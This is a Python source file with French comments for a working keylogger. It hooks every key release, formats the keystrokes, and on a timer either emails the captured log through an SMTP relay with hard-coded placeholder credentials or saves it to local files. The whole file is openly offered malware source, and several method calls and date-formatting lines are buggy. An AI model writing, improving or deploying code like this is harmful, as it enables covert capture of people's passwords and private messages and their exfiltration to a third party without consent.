#pip3 install keyboard pour pouvoir importer la librairies keyboard
import keyboard
#Pour envoyer un email sur un relais smtp
import smtplib
#Libs pour mettre en place le timer d'envoie des log
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY=10 #10sec pour les tests a modifier pour allonger la durée avant l'envoei d'un report

#Config pour l'envoie par mail
EMAIL_ADRESS="yourmail@gmail"
EMAIL_PASSWORD="yourPassword"

class Keylogger:
    def __init__(self, interval, reportMethod="email"):
        self.interval= interval
        self.reportMethod=reportMethod
        self.log=""
        self.startDate=datetime.now()
        self.endDate=datetime.now()
        print(self)
    #Appeler lorsqu'une touche est appuyer reformat certaine touche pour qu'elles soient plus lisibles(fonction a améliorer)
    def callBackKeypressed(self, eventKeyPressed):
        name= eventKeyPressed.name
        if len(name)>1:
            #Change le nom de base "espace" par un espace vide (" ")
            if name=="space":
                name=" "
            #Change le nom enter et ajoute un retour a la ligne
            elif name=="enter":
                name="[ENTER]\n"
            #Change le nom decimal par un point
            elif name=="decimal":
                name="."
            #Remplace les espaces par des underscores
            else:
                name=name.replace(" ","_")
                name=f"[{name.upper()}]"
        #AJoute la nouvelle enter aux logs de la classe
        self.log+=name
    #Envoie le message donnéer a un relais mail
    def sendMail(self, email, password, message):
        #Gere la connexion au serveur SMTP
        server=smtplib.SMTP(host="yourSmtpRealy@mail.com", port=587)
        #Créer une connexion TLS pour plus de sécuriter
        server.starttls()
        #Connexion au compte mail
        server.logn(email, password)
        #Envoie de l'email
        server.sendMail(email, email, message)
        #Termine la session
        server.quit()
#Pour une écriture du logs dans des fichiers locaux a la place de l'envoie par mail
    #Reformat les date dans un format lisible, puis créer un nom de fichier en fonction des dates
    def updateFilename(self):
        startDateString= str(self.startDate)[:-7].replace("","-").replace(":","")
        endDateString= str(self.startDate)[:-7].replace("","-").replace(":","")
        self.fileName=f"Keylog: {startDateString}=>{endDateString}"
    #Créer un fichier log dans le repertoire courant contenant le logger et enregistre les keylof contenue dans log.file
    def reportToFile(self):
        #Ouvre ou créer le fichier en mode écriture
        with open(f"{self.fileName}.txt", "w") as writedFile:
            #Enregistre les keylogs dans le fichier
            print(self.log, file=writedFile)
        print(f"[+] Saved=>{self.fileName}.txt")
    #Enregistre les keylog d'apres un intervalle de temps définis
    def reportKeylogs(self):
        if self.log:
            self.endDate=datetime.now()
            #Mise a jour du nom du fichier
            self.updateFilename()
            #Verifie la méthode choisie entre mail et file puis utilise une des méthodes en conséquences
            if self.reportMethod=="email":
                #Variables globale définis au début du fichier
                self.sendMail(EMAIL_ADRESS,EMAIL_PASSWORD,self.log)
            elif self.reportMethod=="file":
                self.reportToFile()
            #print(f"[{self.fileName}]=>[{self.log}]") #Print le log dans la consolle python
            self.startDate=datetime.now()
        self.log=""
        timer=Timer(interval=self.interval, function=self.reportKeylogs)
        #Le timer meurt lorsque le fil principale de la calsse termine
        timer.daemon= True
        timer.start()
    #Fonction qui active le logger
    def startKeyLogger(self):
        self.startDate=datetime.now()
        keyboard.on_release(callback=self.callBackKeypressed)
        self.reportKeylogs()
        keyboard.wait()

if __name__=="__main__":
    keylogger=Keylogger(interval=SEND_REPORT_EVERY, reportMethod="file")
    keylogger.startKeyLogger()
